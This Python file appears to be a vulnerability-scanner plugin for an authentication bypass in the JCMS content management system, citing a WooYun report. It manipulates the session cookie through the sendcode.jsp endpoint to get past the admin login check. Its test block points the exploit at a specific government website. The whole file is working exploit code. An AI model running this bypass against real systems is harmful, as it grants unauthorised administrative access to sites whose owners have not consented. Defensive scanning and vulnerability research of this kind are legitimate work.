#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2015-0152666
import re

def assign(service, arg):
    if service == "jcms":
        return True, arg
        
def audit(arg):
    url = arg + "setup/opr_licenceinfo.jsp"
    code, head, res, errcode, _ = curl.curl2(url)
    if "top.location='index.html'" in res and re.search('Set-Cookie: ([a-zA-Z0-9=]*);', head):
        url1 = arg + 'jcms_files/jcms1/web1/site/zfxxgk/ysqgk/sendcode.jsp?webid=2&destnum=cookie_username'
        cookie = re.search('Set-Cookie: ([a-zA-Z0-9=]*);', head).group(1)
        code, head, res, errcode, _ = curl.curl2(url1, cookie = cookie)
        code, head, res, errcode, _ = curl.curl2(url, cookie = cookie)
        if "top.location='index.html'" not in res:
            security_hole(url1 + 'jcms Background authority to bypass')

if __name__ == '__main__':
    from dummy import *
    audit(assign('jcms', 'http://zwgk.taojiang.gov.cn/zwgk/')[1])